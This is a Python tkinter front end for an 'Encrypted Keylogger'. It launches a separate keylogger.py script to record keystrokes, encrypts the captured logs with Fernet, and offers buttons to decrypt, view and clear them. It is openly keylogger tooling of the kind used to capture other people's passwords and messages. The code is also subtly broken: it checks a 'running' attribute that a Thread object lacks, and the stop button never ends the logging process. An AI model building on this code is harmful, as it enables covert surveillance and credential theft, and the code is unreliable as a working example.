import os
import json
import threading
import tkinter as tk
from tkinter import messagebox, scrolledtext
from pynput.keyboard import Listener
from cryptography.fernet import Fernet
from datetime import datetime
import subprocess

KEY_FILE = "key.key"
LOG_FILE = "keylog_encrypted.txt"
CONFIG_FILE = "config.json"

listener = None

def generate_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as key_file:
            key_file.write(key)

def load_key():
    return open(KEY_FILE, "rb").read()

def encrypt_log(data):
    key = load_key()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data.encode())
    with open(LOG_FILE, "ab") as log_file:
        log_file.write(encrypted_data + b'\n')

def decrypt_logs():
    key = load_key()
    fernet = Fernet(key)

    if not os.path.exists(LOG_FILE):
        return "No logs found."

    decrypted_text = ""
    with open(LOG_FILE, "rb") as log_file:
        for line in log_file.readlines():
            decrypted_text += fernet.decrypt(line).decode() + "\n"

    return decrypted_text

def start_logging():
    global listener
    if listener and listener.running:
        messagebox.showinfo("Info", "Keylogging is already running.")
        return

    generate_key()
    messagebox.showinfo("Info", "Keylogging started. Press ESC to stop.")
    
    listener = threading.Thread(target=lambda: subprocess.run(["python", "keylogger.py"]))
    listener.start()

def stop_logging():
    global listener
    if listener:
        listener = None
        messagebox.showinfo("Info", "Keylogging stopped.")

def view_logs():
    decrypted_text = decrypt_logs()
    log_window = tk.Toplevel(root)
    log_window.title("Decrypted Logs")
    log_window.geometry("500x400")

    text_area = scrolledtext.ScrolledText(log_window, wrap=tk.WORD, width=60, height=20)
    text_area.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
    text_area.insert(tk.END, decrypted_text)
    text_area.config(state=tk.DISABLED)

def clear_logs():
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
        messagebox.showinfo("Success", "Logs cleared successfully.")
    else:
        messagebox.showwarning("Warning", "No logs to clear.")

def exit_program():
    stop_logging()
    if messagebox.askyesno("Exit", "Are you sure you want to exit?"):
        root.quit()

root = tk.Tk()
root.title("Secure Keylogger")
root.geometry("500x600")
root.configure(bg="white")

tk.Label(root, text="Encrypted Keylogger", font=("Arial", 16, "bold"), bg="white").pack(pady=10)

start_button = tk.Button(root, text="Start Logging", command=start_logging, bg="green", fg="white", width=20, height=2)
start_button.pack(pady=5)

stop_button = tk.Button(root, text="Stop Logging", command=stop_logging, bg="red", fg="white", width=20, height=2)
stop_button.pack(pady=5)

view_button = tk.Button(root, text="View Logs", command=view_logs, bg="blue", fg="white", width=20, height=2)
view_button.pack(pady=5)

clear_button = tk.Button(root, text="Clear Logs", command=clear_logs, bg="orange", fg="black", width=20, height=2)
clear_button.pack(pady=5)

exit_button = tk.Button(root, text="Exit", command=exit_program, bg="gray", fg="white", width=20, height=2)
exit_button.pack(pady=10)

root.mainloop()
